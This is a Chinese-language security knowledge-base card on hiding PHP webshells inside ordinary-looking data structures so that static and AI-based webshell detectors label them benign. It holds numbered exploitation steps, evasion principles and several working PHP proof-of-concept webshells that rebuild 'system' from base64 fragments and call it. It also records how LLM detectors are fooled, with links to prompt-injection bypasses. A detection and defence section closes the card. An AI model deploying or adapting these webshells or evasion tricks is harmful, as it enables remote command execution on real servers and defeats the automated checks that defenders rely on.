---
id: web-php-rce-webshell-business-data-carrier-obfuscation
title: PHP WebShell 业务数据载体分片重组：10 种数组/配置/流/迭代器隐写绕过 AI 检测
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-business-data-carrier-obfuscation
tags:
- php
- webshell
- av-bypass
- obfuscation
- ai-detection
- data-carrier
- spl
- stream-wrapper
- dynamic-call
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T13:46:15+08:00'
  notes: 已对照原文与 10 张图核对：10 种载体代码（array_splice/compact-extract/时区/DOMDocument/JSON/CSV/data:///Generator/FilterIterator/LimitIterator）与原文一致；修正 white 证据表述——图 02-10 只有 9 个不同哈希的 white 样本，FilterIterator 变体未附检测截图；未在本机复跑
url: /docs/web/php/rce/web-php-rce-webshell-business-data-carrier-obfuscation/
draft: false
kb_aliases:
- PHP WebShell 分片重组
- array_splice WebShell
- compact extract WebShell
- 时区名藏 payload
- php://memory CSV 马
- data:// simplexml 马
- 生成器 WebShell
- LimitIterator 分页马
- 伏魔杯 AI 检测 white
---

## 一句话结论

把危险函数名拆成 `sys`+`tem`、命令 Base64 编码后，分散藏进 `array_splice` 数组、`compact()/extract()` 变量、时区字符串、DOMDocument XML、JSON 配置、`php://memory` CSV、`data://` XML、Generator、FilterIterator 日志流、LimitIterator 分页数据等业务结构，运行时再拼接并通过 `($func)($arg)` 调用；文件中不出现完整的敏感函数名或命令，原文 10 种载体均给出完整代码，其中图 02-10 的 9 个样本（哈希各不相同）在伏魔杯 AI WebShell 检测环境中均显示 `white`，而传统分支对抗样本被识别为“任意命令执行”；FilterIterator 变体原文未附检测截图。

## 原理

- **检测器依赖 token 与局部结构**：完整出现 `system`、`eval`、`whoami`、`$_GET` 等是强信号；把函数名拆成两段、命令 Base64 后，文件里没有可匹配的完整敏感串，静态规则和只看局部语义的 AI 都可能漏报。
- **载体是合法业务数据**：数组插入、变量打包/提取、时区名、XML/JSON/CSV 配置、内存流、生成器、日志流、分页数据，都是正常业务代码常见结构；检测器容易把它们解释为“配置处理/数据清洗”，而不是恶意 payload。
- **运行时重组**：`base64_decode` + 字符串拼接 + `function_exists` + 可变函数 `($func)($arg)`，危险语义只在内存中短暂出现，落盘代码只有普通字符串、数组和解析调用。
- **各载体的隐藏点**：
  - `array_splice`：在无害数组指定位置插入 `c3lz`/`dGVt`/`d2hvYW1p` 片段，再按索引取回拼接；插入操作看起来像普通数组编辑。
  - `compact()/extract()`：变量打包为关联数组，再用 `EXTR_PREFIX_ALL` 导入符号表；变量名与数据分离，增加静态分析难度。
  - 时区名称：`America/c3lz`、`Europe/dGVt`、`Asia/d2hvYW1p`，按 `/` 切分取末段 Base64 解码；伪装成时区配置。
  - DOMDocument + XPath：`<function><part>sys</part><part>tem</part></function><data>d2hvYW1p</data>`，从 XML 节点拼函数名、解码命令。
  - JSON 配置：`functionParts` 带 `id`，`usort` 按 id 排序后拼接；命令放在 `parameters.data` + `encoding=base64`。
  - `php://memory` + `fgetcsv`：CSV 内容写入内存流，`fgetcsv` 逐行提取 `func1/func2/cmd`；不落盘，解析行为合法。
  - `data://` + `simplexml_load_file`：XML 经 Base64 塞进 `data://text/plain;base64,...`，不创建外部文件，无敏感明文。
  - Generator：`yield 'func_part' => 'sys'` 等逐项输出“配置”，`foreach` 重组。
  - `FilterIterator`：日志流混入 `func_part`/`command` 条目，`accept()` 只保留目标类型，过滤 info/debug 干扰。
  - `LimitIterator` + 分页：分页数据 `hidden` 字段分散 `sys`/`tem`/命令，按页遍历收集。
- **为什么 AI 会漏**：检测器把 `json_decode`、`fgetcsv`、`simplexml_load_file`、`FilterIterator` 等当作业务数据处理，没有把数组索引/迭代器 `current()`/解码结果追踪到最终可变函数调用；也没有先做拆分字符串还原与常量折叠。
- **边界**：只规避静态/AI 内容检测，不规避运行时子进程监控、`disable_functions`、WAF 上传拦截；检测器若做反混淆、污点分析或沙箱执行，仍可能命中。

## 触发条件

- 目标 PHP 环境允许危险函数（`system`/`exec` 等未被 `disable_functions` 禁用），文件可落地并被 Web 访问。
- AI/静态 WebShell 检测把源码直接交给规则/LLM 判定，缺少反混淆、AST 污点分析与运行时沙箱。
- 检测器未对 `base64_decode` + 可变函数、数组/配置/迭代器重组等模式做专门规则。
- 攻击者能控制 PHP 文件内容（上传、写入、包含等），并能访问触发。

## 利用步骤

1. 选择执行函数与命令，把函数名拆成无害片段（如 `sys`+`tem`），命令 Base64（`whoami` → `d2hvYW1p`）。
2. 选一种业务载体隐藏片段：数组插入、变量打包、时区字符串、XML/JSON/CSV 配置、内存流、生成器、迭代器/分页。
3. 运行时按载体规则提取、拼接函数名、解码命令，`function_exists` 校验后 `($func)($arg)` 调用。
4. 落地为 `.php` 并访问；观察是否执行以及 AI 检测结果是否为 `white`。
5. 若被检测，换另一种载体或增加正常业务代码前缀/干扰数据；原文展示的 9 个样本截图（图 02-10）均为 `white`。
6. 注意：命令执行本身是最终验证；仅“white”不等于运行时一定成功，需实际访问确认。

## PoC

`array_splice` 载体（最小形态）：

```php
<?php
$dataArray = ['item1', 'item2', 'item3', 'item4'];
array_splice($dataArray, 1, 0, ['c3lz']);      // sys
array_splice($dataArray, 3, 0, ['dGVt']);      // tem
array_splice($dataArray, 5, 0, ['d2hvYW1p']);  // whoami
$func = base64_decode($dataArray[1]) . base64_decode($dataArray[3]);
$arg  = base64_decode($dataArray[5]);
if ($func === 'system' && $arg === 'whoami') { $func($arg); }
```

`compact()/extract()` 载体：

```php
<?php
$part1 = 'c3lz'; $part2 = 'dGVt'; $cmd = 'd2hvYW1p';
$config = compact('part1', 'part2', 'cmd');
extract($config, EXTR_PREFIX_ALL, 'cfg');
$func = base64_decode($cfg_part1) . base64_decode($cfg_part2);
$arg  = base64_decode($cfg_cmd);
if ($func === 'system' && $arg === 'whoami') { $func($arg); }
```

`php://memory` + CSV 载体：

```php
<?php
$csv = "key,data\nfunc1,sys\nfunc2,tem\ncmd,d2hvYW1p\n";
$h = fopen('php://memory', 'r+');
fwrite($h, $csv); rewind($h);
fgetcsv($h); $func = ''; $arg = '';
while (($row = fgetcsv($h)) !== false) {
    [$k, $v] = $row;
    if ($k === 'func1' || $k === 'func2') $func .= $v;
    elseif ($k === 'cmd') $arg = base64_decode($v);
}
fclose($h);
if ($func && $arg && function_exists($func)) ($func)($arg);
```

`data://` + SimpleXML 载体：

```php
<?php
$data = 'data://text/plain;base64,' . base64_encode(
  '<config><function>system</function><argument>d2hvYW1p</argument></config>');
$xml = simplexml_load_file($data);
$func = (string)$xml->function; $arg = base64_decode((string)$xml->argument);
if (function_exists($func)) ($func)($arg);
```

其余载体：时区名（`America/c3lz` 等）、DOMDocument+XPath、JSON `functionParts`+`usort`、Generator `yield`、`FilterIterator` 日志流、`LimitIterator` 分页 `hidden` 字段；原文均给出完整代码，图 02-10 为 9 个不同哈希的 `1.php` 检测截图，均显示 `white`；FilterIterator 变体未附检测截图。本卡未复跑，且只测过原文的特定检测环境。

## 变体与关联

- **载体变体**：数组/对象属性、YAML/INI/序列化配置、图片 EXIF、注释、日志文件、模板变量；核心都是“分片 + 编码 + 运行时重组”。
- **编码变体**：Base64、十六进制、ROT13、按位取反、`chr()` 查表、字符串反转；与载体可自由组合。
- **调用变体**：可变函数 `($f)($a)`、`call_user_func`、`array_map`、`preg_replace /e`（旧 PHP）等。
- **关联**：[[ai-security-prompt-injection-ai-webshell-detector-structural-blindspots]]（AI 检测的结构盲区：强比较、作用域、业务后置、JSON 数据化）、[[web-php-rce-iterator-webshell-split-reassemble]]（SPL 迭代器拆分函数名/命令）、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（字符串取反 + 可变变量免杀）、[[ai-security-prompt-injection-ai-webshell-detector-comment-bypass]]（注释提示词注入绕过 AI 检测）。
- **边界**：运行时行为监控（`execve`、子进程、网络外联）仍能捕获；`disable_functions` 禁用执行函数时需另找原语；AI 检测器做反混淆/污点分析/沙箱时可能失效。

## 检测与防御

- **反混淆预处理**：检测前还原 Base64/十六进制/字符串拼接/`chr()` 查表/数组索引，做常量折叠；对 `compact/extract`、`array_splice`、`php://memory`、`data://`、`simplexml_load_file`、`fgetcsv`、Generator、SPL 迭代器等载体建立专项规则。
- **数据流追踪**：不要只匹配 token；追踪 `base64_decode`/数组元素/迭代器 `current()`/XML 节点值到 `($var)(...)`、`call_user_func`、`array_map` 等 sink 的污点路径。
- **AI 检测复核**：LLM 结论必须由 AST/污点分析/沙箱复核；对 `white` 结论保留人工抽检，特别是包含大量无意义数组、配置解析、编码解码与 `function_exists` 的文件。
- **运行时防护**：`disable_functions` 禁用危险函数、`open_basedir`、上传目录禁止 PHP 解析、WAF 拦截 WebShell 上传、PHP 进程行为监控（子进程、文件写入、网络外联）。
- **检测评估**：用多种载体/编码组合做对抗测试，记录漏报并持续补规则；不要假设“换个载体”就能通杀所有检测器。
